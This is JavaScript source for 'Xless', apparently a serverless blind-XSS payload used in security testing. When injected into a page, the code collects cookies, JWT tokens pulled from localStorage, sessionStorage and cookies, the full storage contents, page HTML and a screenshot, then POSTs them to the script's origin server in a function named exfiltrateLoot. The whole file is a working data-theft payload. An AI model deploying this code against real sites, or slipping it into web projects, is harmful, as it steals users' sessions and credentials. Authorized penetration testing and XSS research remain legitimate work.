// Xless: The serverlesss Blind XSS app.
// Author: Mazin Ahmed <mazin@mazinahmed.net>
(function () {
  var curScript = document.currentScript;

  console.log("Loaded xless.");

  function screenshot() {
    return html2canvas(document.querySelector("html"), {
      letterRendering: 1,
      allowTaint: true,
      useCORS: true,
      width: 1024,
      height: 768,
    })
      .then(function (canvas) {
        return canvas.toDataURL(); // png in dataURL format
      })
      .catch(function () {
        return "";
      });
  }

  function collectData() {
    var collectedData = {
      Location: function () {
        return location.toString();
      },
      "Document Domain": function () {
        return document.domain;
      },
      "Document Location": function () {
        return document.location.toString();
      },
      Cookies: function () {
        return document.cookie;
      },
      Referrer: function () {
        return document.referrer;
      },
      "User-Agent": function () {
        return navigator.userAgent;
      },
      "Browser Time": function () {
        return new Date().toTimeString();
      },
      Origin: function () {
        return location.origin;
      },
      "JWT Tokens": function () {
        // Attempt to find JWTs in localStorage, sessionStorage, and cookies
        var tokens = [];
        var jwtRegex = /ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*/g;

        function searchStorage(storage) {
          for (var i = 0; i < storage.length; i++) {
            var key = storage.key(i);
            var value = storage.getItem(key);
            if (value && typeof value === 'string') {
              var matches = value.match(jwtRegex);
              if (matches) {
                matches.forEach(function (m) {
                  if (!tokens.includes(m)) tokens.push(m);
                });
              }
            }
          }
        }

        try { searchStorage(localStorage); } catch (e) { }
        try { searchStorage(sessionStorage); } catch (e) { }
        try {
          if (document.cookie) {
            var cookieMatches = document.cookie.match(jwtRegex);
            if (cookieMatches) {
              cookieMatches.forEach(function (m) {
                if (!tokens.includes(m)) tokens.push(m);
              });
            }
          }
        } catch (e) { }

        return tokens.length > 0 ? tokens.join("\n") : "None found";
      },
      DOM: function () {
        return document.documentElement.outerHTML
          .toString()
          .replace(/\n/g, "")
          .replace(/[\t ]+</g, "<")
          .replace(/>[\t ]+</g, "><")
          .replace(/>[\t ]+$/g, ">")
          .replace("`", "")
          .slice(0, 8192);
      },
      localStorage: function () {
        return JSON.stringify(localStorage);
      },
      sessionStorage: function () {
        return JSON.stringify(sessionStorage);
      },
      Screenshot: function () {
        return screenshot();
      },
    };

    return Promise.all(
      Object.keys(collectedData).map(function (key) {
        try {
          return Promise.resolve(collectedData[key]()).then(function (value) {
            collectedData[key] = value || "";
          });
        } catch (e) {
          collectedData[key] = "";
          return Promise.resolve();
        }
      })
    ).then(function () {
      return collectedData;
    });
  }

  function exfiltrateLoot(collectedData) {
    // Get the URI of our BXSS server
    var uri = new URL(curScript.src);
    var exfUrl = uri.origin + "/c";

    var xhr = new XMLHttpRequest();
    xhr.open("POST", exfUrl, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(collectedData));
  }

  function loadScript(src) {
    return new Promise(function (resolve) {
      var script = document.createElement("script");
      script.type = "text/javascript";
      script.async = true;
      script.onload = resolve;
      script.onerror = resolve;
      script.src = src;
      document.getElementsByTagName("head")[0].appendChild(script);
    });
  }

  // Load the html2canvas dependency
  loadScript(
    "https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js"
  )
    .then(collectData)
    .then(exfiltrateLoot);
})();
